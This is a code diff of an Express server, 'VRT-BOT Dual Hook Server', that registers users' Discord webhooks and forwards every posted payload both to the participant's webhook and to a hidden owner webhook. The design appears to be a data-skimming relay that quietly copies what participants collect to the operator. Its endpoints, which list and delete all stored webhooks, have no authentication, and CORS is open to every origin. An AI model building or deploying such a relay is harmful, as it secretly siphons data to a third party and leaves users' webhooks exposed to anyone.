@@ -10,11 +10,10 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-//  ✅ CORS CONFIGURATION - COMPLETELY FIXED
+//  ✅ CORS - MUST BE BEFORE ANY ROUTES
 // ============================================================
-// Apply CORS middleware BEFORE any routes
 app.use(cors({
-    origin: '*', // Allow all origins
+    origin: '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
     allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
     credentials: true,
@@ -22,7 +21,6 @@ app.use(cors({
     optionsSuccessStatus: 204
 }));
 
-// Handle preflight requests for all routes
 app.options('*', (req, res) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
@@ -30,19 +28,7 @@ app.options('*', (req, res) => {
     res.sendStatus(204);
 });
 
-// Add CORS headers to every response
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept');
-    if (req.method === 'OPTIONS') {
-        return res.sendStatus(204);
-    }
-    next();
-});
-
 app.use(express.json());
-app.use(express.static('public'));
 
 // ============================================================
 //  OWNER'S HARDCODED WEBHOOK (from .env)
@@ -87,10 +73,10 @@ function generateId() {
 }
 
 // ============================================================
-//  ROUTES
+//  ✅ ROUTES - All return JSON
 // ============================================================
 
-// Health check
+// Health check - MUST return JSON
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
@@ -110,14 +96,12 @@ app.post('/api/generate', (req, res) => {
         return res.status(400).json({ error: 'Username and webhook URL required' });
     }
 
-    // Validate webhook URL
     if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
         return res.status(400).json({ error: 'Invalid Discord webhook URL' });
     }
 
     const webhooks = loadWebhooks();
     
-    // Check if user already has a hook
     let existingId = null;
     for (const [id, data] of Object.entries(webhooks)) {
         if (data.username === username) {
@@ -127,7 +111,6 @@ app.post('/api/generate', (req, res) => {
     }
 
     if (existingId) {
-        // Update existing webhook
         webhooks[existingId] = {
             username,
             webhookUrl,
@@ -139,12 +122,11 @@ app.post('/api/generate', (req, res) => {
             success: true,
             message: 'Webhook updated successfully',
             hookId: existingId,
-            hookUrl: `https://${req.get('host')}/hook/${existingId}`,
+            hookUrl: `https://vrtxduel.onrender.com/hook/${existingId}`,
             isNew: false
         });
     }
 
-    // Generate new ID
     let id = generateId();
     while (webhooks[id]) {
         id = generateId();
@@ -162,7 +144,7 @@ app.post('/api/generate', (req, res) => {
         success: true,
         message: 'Webhook registered successfully',
         hookId: id,
-        hookUrl: `https://${req.get('host')}/hook/${id}`,
+        hookUrl: `https://vrtxduel.onrender.com/hook/${id}`,
         isNew: true
     });
 });
@@ -184,7 +166,7 @@ app.get('/api/hook/:id', (req, res) => {
     });
 });
 
-// Get all registered hooks (for owner dashboard)
+// Get all registered hooks
 app.get('/api/hooks/all', (req, res) => {
     const webhooks = loadWebhooks();
     const list = Object.entries(webhooks).map(([id, data]) => ({
@@ -197,7 +179,7 @@ app.get('/api/hooks/all', (req, res) => {
     res.json(list);
 });
 
-// Delete a hook (for owner)
+// Delete a hook
 app.delete('/api/hook/:id', (req, res) => {
     const { id } = req.params;
     const webhooks = loadWebhooks();
@@ -212,7 +194,7 @@ app.delete('/api/hook/:id', (req, res) => {
 });
 
 // ============================================================
-//  SEND TO DUAL HOOKS (Owner's + Participant's)
+//  SEND TO DUAL HOOKS
 // ============================================================
 app.post('/api/send/:hookId', async (req, res) => {
     const { hookId } = req.params;
@@ -232,7 +214,6 @@ app.post('/api/send/:hookId', async (req, res) => {
     const results = [];
     const errors = [];
 
-    // 1. Send to Owner's hardcoded webhook
     if (OWNER_WEBHOOK) {
         try {
             const response = await fetch(OWNER_WEBHOOK, {
@@ -256,7 +237,6 @@ app.post('/api/send/:hookId', async (req, res) => {
         errors.push('Owner webhook not configured');
     }
 
-    // 2. Send to Participant's webhook
     if (participantHook.webhookUrl) {
         try {
             const response = await fetch(participantHook.webhookUrl, {
@@ -291,17 +271,15 @@ app.post('/api/send/:hookId', async (req, res) => {
 });
 
 // ============================================================
-//  START SERVER
+//  ✅ START SERVER
 // ============================================================
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 VRT-BOT Dual Hook Server running on port ${PORT}`);
     console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
     console.log(`📁 Registered hooks: ${Object.keys(loadWebhooks()).length}`);
-    console.log(`🔗 Health: https://vrtxduel.onrender.com/`);
     console.log(`✅ CORS enabled for all origins`);
 });
 
-// Handle shutdown gracefully
 process.on('SIGTERM', () => {
     console.log('SIGTERM signal received: closing HTTP server');
     process.exit(0);
